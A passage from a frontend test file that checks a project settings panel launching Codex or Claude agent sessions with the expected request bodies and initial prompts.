        <ProjectSettingsPanel project={project} />
      </OpenSessionContext.Provider>,
    );
    await userEvent.click(screen.getByRole('button', { name: 'Set up with an agent' }));
    await userEvent.click(await screen.findByRole('menuitem', { name: 'Codex' }));
    await waitFor(() => expect(opened).toEqual(['s1']));
    expect(calls.find((c) => c.method === 'POST')!.body).toMatchObject({
      projectId: 'p', kind: 'agent_tui', agent: 'codex', mode: 'conversation', initialPrompt: 'Set up this project so PDT can run it.',
    });
    expect(calls.find((c) => c.method === 'POST')!.body).not.toHaveProperty('worktreeId');

    await userEvent.click(screen.getByRole('button', { name: 'Write instructions with an agent' }));
    await userEvent.click(await screen.findByRole('menuitem', { name: 'Claude' }));
    await waitFor(() => expect(opened).toEqual(['s1', 's1']));
    expect(calls.filter((c) => c.method === 'POST')[1].body).toMatchObject({ agent: 'claude', initialPrompt: 'Help me write the agent instructions.' });
  });
});
